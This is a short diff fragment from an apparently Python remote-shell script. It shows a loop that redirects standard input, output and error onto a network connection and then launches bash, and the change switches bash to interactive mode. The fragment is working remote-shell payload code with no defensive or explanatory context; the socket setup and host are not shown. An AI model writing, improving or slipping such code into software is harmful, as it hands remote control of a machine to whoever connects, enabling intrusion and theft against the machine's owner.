@@ -19,4 +19,4 @@ while 1: # infinite loop
     os.dup2(connection.fileno(),0) # duplicate stdin to the connection
     os.dup2(connection.fileno(),1) # duplicate stdout to the connection
     os.dup2(connection.fileno(),2) # duplicate stderr to the connection
-    subprocess.call(['/bin/bash']) # call /bin/bash
+    subprocess.call(['/bin/bash','-i']) # call /bin/bash in interactive mode
